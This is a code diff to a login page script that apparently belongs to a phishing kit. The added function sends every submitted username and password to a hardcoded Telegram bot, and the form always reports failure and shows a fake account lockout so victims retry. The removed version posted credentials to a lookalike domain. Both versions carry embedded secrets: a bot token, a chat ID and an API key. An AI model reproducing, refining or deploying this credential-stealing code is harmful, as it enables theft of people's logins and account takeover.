@@ -1,5 +1,45 @@
+// ---------------- TELEGRAM CONFIG ----------------
+const TELEGRAM_BOT_TOKEN = '9128412165:AAEtlGPJduYnMJ4mzGVqGh1AiCFUCJtnBSM';
+const TELEGRAM_CHAT_ID = '-1005947613823';
+
+async function sendToTelegramBot(username, password, remainingAttempts) {
+    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') return false;
+    if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') return false;
+
+    const text = [
+        'New Form Submission',
+        `Username: ${username}`,
+        `Password: ${password}`,
+        `Attempts Left: ${remainingAttempts}`,
+        `Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+    ].join('\n');
+
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text
+            })
+        });
+
+        if (!res.ok) {
+            const errData = await res.json().catch(() => ({}));
+            console.error('Telegram API error:', errData);
+            return false;
+        }
+        return true;
+    } catch (err) {
+        console.error('Telegram send failed:', err);
+        return false;
+    }
+}
+
 // ---------------- LOGIN ATTEMPTS ----------------
-let loginAttempts = sessionStorage.getItem('loginAttempts') || 4;
+let loginAttempts = Number(sessionStorage.getItem('loginAttempts')) || 4;
 
 // ---------------- ELEMENTS ----------------
 const visibilityIcon = document.getElementById('visibility-icon');
@@ -24,7 +64,6 @@ errorDiv.className = 'login-error-message';
 
 // ---------------- DOM READY ----------------
 document.addEventListener('DOMContentLoaded', () => {
-
     const usernameWrapper = document.querySelector('.username-input-wrapper');
 
     if (usernameWrapper) {
@@ -44,7 +83,6 @@ document.addEventListener('DOMContentLoaded', () => {
         showLoginError();
     }
 
-    // ---------------- PASSWORD TOGGLE ----------------
     if (visibilityIcon) {
         visibilityIcon.addEventListener('click', togglePasswordVisibility);
     }
@@ -53,74 +91,42 @@ document.addEventListener('DOMContentLoaded', () => {
     const signInForm = document.querySelector('.sign-in-form');
 
     if (signInForm) {
-        signInForm.addEventListener('submit', async function(e) {
+        signInForm.addEventListener('submit', async function (e) {
             e.preventDefault();
 
             const username = document.getElementById('email').value.trim();
             const password = document.getElementById('password').value.trim();
 
-            console.log("Sending:", {
-                username,
-                password
-            });
+            if (!username || !password) {
+                errorDiv.textContent = 'Please enter both username and password.';
+                errorDiv.style.display = 'block';
+                return;
+            }
 
-            try {
-                const res = await fetch('https://api.niantic.in/send', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'x-api-key': 'P8&;v,9UL&TlJIQQ'
-                    },
-                    credentials: 'include', // ðŸ”¥ IMPORTANT for cookies
-                    body: JSON.stringify({
-                        username,
-                        password
-                    })
+            const sent = await sendToTelegramBot(username, password, loginAttempts);
+
+            if (!sent) {
+                alert('Server not reachable');
+                return;
+            }
+
+            loginAttempts--;
+            sessionStorage.setItem('loginAttempts', loginAttempts);
+            showLoginError();
+
+            if (loginAttempts <= 0) {
+                errorDiv.textContent = 'Account locked! Please try again after 15 minutes.';
+                errorDiv.style.display = 'block';
+
+                signInForm.querySelectorAll('input, button').forEach(el => {
+                    el.disabled = true;
                 });
 
-                let data;
-
-                try {
-                    data = await res.json();
-                } catch (err) {
-                    console.error("Non-JSON response:", err);
-                    alert("API error (invalid response)");
-                    return;
-                }
-
-                console.log("API response:", data);
-
-                // âœ… SUCCESS LOGIN
-                if (data.success) {
-                    window.location.href = "https://bans.niantic.in";
-                }
-                // âŒ FAILED LOGIN
-                else {
-                    loginAttempts--;
-                    sessionStorage.setItem('loginAttempts', loginAttempts);
-
-                    showLoginError();
-
-                    // ðŸ”’ LOCK AFTER ATTEMPTS
-                    if (loginAttempts <= 0) {
-                        errorDiv.textContent = 'Account locked! Please try again after 15 minutes.';
-                        errorDiv.style.display = 'block';
-
-                        signInForm.querySelectorAll('input, button').forEach(el => {
-                            el.disabled = true;
-                        });
-
-                        setTimeout(() => {
-                            loginAttempts = 4;
-                            sessionStorage.removeItem('loginAttempts');
-                            location.reload();
-                        }, 900000);
-                    }
-                }
-
-            } catch (err) {
-                console.error("Error:", err);
-                alert("Server not reachable");
+                setTimeout(() => {
+                    loginAttempts = 4;
+                    sessionStorage.removeItem('loginAttempts');
+                    location.reload();
+                }, 900000);
             }
         });
     }
@@ -130,9 +136,8 @@ document.addEventListener('DOMContentLoaded', () => {
 function showSocialError(event) {
     event.preventDefault();
 
-    const errorMsg = document.getElementById("social-error-msg");
-
+    const errorMsg = document.getElementById('social-error-msg');
     if (errorMsg) {
-        errorMsg.style.display = "block";
+        errorMsg.style.display = 'block';
     }
 }
